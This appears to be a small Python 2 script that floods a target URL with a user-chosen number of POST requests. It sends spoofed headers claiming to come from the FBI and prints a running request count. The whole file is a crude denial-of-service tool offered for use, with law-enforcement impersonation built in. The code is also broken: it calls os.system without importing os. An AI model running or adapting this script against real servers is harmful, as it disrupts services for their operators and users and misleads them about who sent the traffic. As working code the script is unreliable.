#!/usr/bin/python

import requests
import sys

#/* Headers */
headers = {
    'User-Agent': 'FBI WAS HERE',
    'From': 'warrant@fbi.gov'
}

def main():
        if len(sys.argv) == 3:
                target = sys.argv[1]
                amount = sys.argv[2]
                for x in range(int(amount)):
                        r = requests.post(target, headers=headers)
                        xz = x + 1
                        os.system('clear')
                        print "[*] Sending %s requests" % (xz)
        else:
                print "./%s <target> <amount>" % (sys.argv[0])
main()
